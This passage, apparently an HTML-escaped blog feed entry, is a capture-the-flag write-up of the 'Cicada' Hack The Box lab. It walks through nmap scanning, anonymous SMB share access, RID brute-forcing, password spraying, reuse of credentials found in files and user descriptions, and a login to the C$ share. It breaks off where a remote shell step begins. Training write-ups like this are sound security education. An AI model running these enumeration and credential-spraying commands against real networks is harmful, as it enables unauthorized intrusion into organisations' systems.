      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sV -sC -Pn 10.10.11.35 --max-rate=1000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 10:22 +04
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.098s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-18 13:22:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-18T13:23:35
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;We find out that 10.10.11.35 host has cicada.htb domain.&lt;/li&gt;
&lt;li&gt;The system has active SMB, LDAP, RPC over HTTP services enabled, which can be further studied and dissected for weaknesses and vulnerabilities.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Listing NULL(unauthorized/anonymous) SMB SHARES&lt;/p&gt;</description>
      <content>&lt;p&gt;IP: 10.10.11.35&lt;/p&gt;
&lt;p&gt;Nmap scan results for 10.10.11.35 machine. &lt;/p&gt;
&lt;p&gt;Parameters:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;`sV` - Probe open ports to determine service/version info&lt;/li&gt;
&lt;li&gt;&amp;lsquo;sC&amp;rsquo; - equivalent to &amp;ndash;script=default&lt;/li&gt;
&lt;li&gt;&amp;lsquo;Pn&amp;rsquo; - Treat all hosts as online &amp;ndash; skip host discovery&lt;/li&gt;
&lt;li&gt;&amp;lsquo;&amp;ndash;max-rate=1000&amp;rsquo; - Send packets no faster than 1000 packets per second&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;nmap -sV -sC -Pn 10.10.11.35 --max-rate=1000

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-18 10:22 +04
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.098s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-18 13:22:50Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&amp;lt;unsupported&amp;gt;, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-11-18T13:23:35
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 96.30 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;ol&gt;
&lt;li&gt;We find out that 10.10.11.35 host has cicada.htb domain.&lt;/li&gt;
&lt;li&gt;The system has active SMB, LDAP, RPC over HTTP services enabled, which can be further studied and dissected for weaknesses and vulnerabilities.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Listing NULL(unauthorized/anonymous) SMB SHARES&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; smbclient --no-pass -L //10.10.11.35
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After that I tried logging into these SMB shares. HR share was accessible without authorization and had a content inside.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
&amp;gt; smbclient //10.10.11.35/HR -U &amp;#34; &amp;#34;%&amp;#34; &amp;#34;
Try &amp;#34;help&amp;#34; to get a list of possible commands.
smb: \&amp;gt; dir
  .                                   D        0  Thu Mar 14 16:29:09 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Notice from HR.txt                  A     1266  Wed Aug 28 21:31:48 2024

&amp;gt; smb: \&amp;gt; recurse ON
&amp;gt; smb: \&amp;gt; mget *
Get file Notice from HR.txt? yes
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The contents of the file `Notice From HR.txt` included a message from the HR notifying the new employee about their default password, although username was not mentioned.&lt;/p&gt;
&lt;p&gt;user default password: &lt;code&gt;Cicada$M6Corpb*@Lp#nZp!8&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;now i need to guess which user&amp;rsquo;s password is this.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m going to enumerate users by Brute-forcing RID&amp;rsquo;s using NetExec tool&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; nxc smb 10.10.11.35  -u guest -p &amp;#39;&amp;#39; --rid-brute
OR
&amp;gt; nxc smb 10.10.11.35  -u none -p &amp;#39;&amp;#39; --rid-brute&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Both of the above produces the same result&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SMB  10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB  10.10.11.35     445    CICADA-DC        [+] cicada.htb\guest: 
SMB  10.10.11.35     445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB  10.10.11.35     445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB  10.10.11.35     445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB  10.10.11.35     445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then i used AWK to get usernames separately for brute-forcing.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; cat enum_accs.txt | awk &amp;#39;{print $6}&amp;#39; &amp;gt; users.txt
&amp;gt; cat users.txt | awk -F &amp;#34;\\&amp;#34; &amp;#39;{print $2}&amp;#39; &amp;gt; usernames.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Which produces&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;guest:
Enterprise
Administrator
Guest
krbtgt
Domain
Domain
Domain
Domain
Domain
Cert
Schema
Enterprise
Group
Read-only
Cloneable
Protected
Key
Enterprise
RAS
Allowed
Denied
CICADA-DC$
DnsAdmins
DnsUpdateProxy
Groups
john.smoulder
sarah.dantelia
michael.wrightson
david.orelious
Dev
emily.oscars&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Next i pass enumerated users and known passwords and see which account matches this password&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; nxc smb 10.10.11.35 -u enum_users.txt -p &amp;#39;Cicada$M6Corpb*@Lp#nZp!8&amp;#39; --continue-on-success&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;michael.wrightson account was a match.&lt;/p&gt;
&lt;p&gt;Then we test user connection by listing network shares as an authorized user&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; smbclient -L 10.10.11.35 -W cicada.htb -U michael.wrightson.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And it works!&lt;/p&gt;
&lt;p&gt;Then, let&amp;rsquo;s go ahead and login to RPC client as an authorized user and see what we can do or act on.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rpcclient 10.10.11.35 -U michael.wrightson%&amp;#39;Cicada$M6Corpb*@Lp#nZp!8&amp;#39; -W cicada.htb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And we got access to RPC session as an authorized user.&lt;/p&gt;
&lt;p&gt;Now let&amp;rsquo;s enumerate available users and groups on the system&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rpcclient $&amp;gt; enumdomusers 
	user:[Administrator] rid:[0x1f4]
	user:[Guest] rid:[0x1f5]
	user:[krbtgt] rid:[0x1f6]
	user:[john.smoulder] rid:[0x450]
	user:[sarah.dantelia] rid:[0x451]
	user:[michael.wrightson] rid:[0x452]
	user:[david.orelious] rid:[0x454]
	user:[emily.oscars] rid:[0x641]

rpcclient $&amp;gt; enumdomgroups
	group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
	group:[Domain Admins] rid:[0x200]
	group:[Domain Users] rid:[0x201]
	group:[Domain Guests] rid:[0x202]
	group:[Domain Computers] rid:[0x203]
	group:[Domain Controllers] rid:[0x204]
	group:[Schema Admins] rid:[0x206]
	group:[Enterprise Admins] rid:[0x207]
	group:[Group Policy Creator Owners] rid:[0x208]
	group:[Read-only Domain Controllers] rid:[0x209]
	group:[Cloneable Domain Controllers] rid:[0x20a]
	group:[Protected Users] rid:[0x20d]
	group:[Key Admins] rid:[0x20e]
	group:[Enterprise Key Admins] rid:[0x20f]
	group:[DnsUpdateProxy] rid:[0x44e]
	group:[Groups] rid:[0x44f]
	group:[Dev Support] rid:[0x455]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;After querying each user I came across david.orelious Description. It contains users comment, which contains the password of the user.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rpcclient $&amp;gt; queryuser david.orelious
		User Name   :	david.orelious
	Full Name   :	
	Home Drive  :	
	Dir Drive   :	
	Profile Path:	
	Logon Script:	
	Description :	Just in case I forget my password is aRt$Lp#7t*VQ!3
	Workstations:	
	Comment     :	
	Remote Dial :
	Logon Time               :	Fri, 15 Mar 2024 10:32:22 +04
	Logoff Time              :	Thu, 01 Jan 1970 04:00:00 +04
	Kickoff Time             :	Thu, 14 Sep 30828 06:48:05 +04
	Password last set Time   :	Thu, 14 Mar 2024 16:17:30 +04
	Password can change Time :	Fri, 15 Mar 2024 16:17:30 +04
	Password must change Time:	Thu, 14 Sep 30828 06:48:05 +04
	unknown_2[0..31]...
	user_rid :	0x454
	group_rid:	0x201
	acb_info :	0x00000210
	fields_present:	0x00ffffff
	logon_divs:	168
	bad_password_count:	0x00000000
	logon_count:	0x00000000
	padding1[0..7]...
	logon_hrs[0..21]...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now, I can login to SMB DEV share with this account.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smbclient //10.10.11.35/DEV -U david.orelious%&amp;#39;aRt$Lp#7t*VQ!3&amp;#39; -W cicada.htb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Once session is established, we can see the ps1 script present on the share.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smb: \&amp;gt; dir
  .                                   D        0  Thu Mar 14 16:31:39 2024
  ..                                  D        0  Thu Mar 14 16:21:29 2024
  Backup_script.ps1                   A      601  Wed Aug 28 21:28:22 2024

		4168447 blocks of size 4096. 431820 blocks available
smb: \&amp;gt; get Backup_script.ps1 
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let&amp;rsquo;s examine &lt;code&gt;Backup_script.ps1&lt;/code&gt;&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;ps1&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ps1&#34; data-lang=&#34;ps1&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$username = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;emily.oscars&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$password = ConvertTo-SecureString &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Q!3@Lp#M6b*7t*Vt&amp;#34;&lt;/span&gt; -AsPlainText -Force
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$dateStamp = Get-Date -Format &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;yyyyMMdd_HHmmss&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$backupFileName = &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;smb_backup_&lt;/span&gt;$dateStamp&lt;span style=&#34;color:#e6db74&#34;&gt;.zip&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Write-Host &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Backup completed successfully. Backup file saved to: &lt;/span&gt;$backupFilePath&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The script reveals another user&amp;rsquo;s information. Namely, &lt;code&gt;emily.oscars&lt;/code&gt; password is &lt;code&gt;Q!3@Lp#M6b*7t*Vt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;then I logged into Emily&amp;rsquo;s user account in SMB&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smbclient //10.10.11.35/C$ -U emily.oscars%&amp;#39;Q!3@Lp#M6b*7t*Vt&amp;#39; -W cicada.htb&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;and retrieved an user.txt flag from&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C:\Users\emily.oscars.CICADA\Desktop\user.txt&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Up until this point I got by without any help. Then I got stuck and looked up other people&amp;rsquo;s approaches.&lt;/p&gt;
&lt;p&gt;I got remote interactive shell access with &lt;code&gt;evil-winrm&lt;/code&gt; to emily&amp;rsquo;s user account.&lt;/p&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
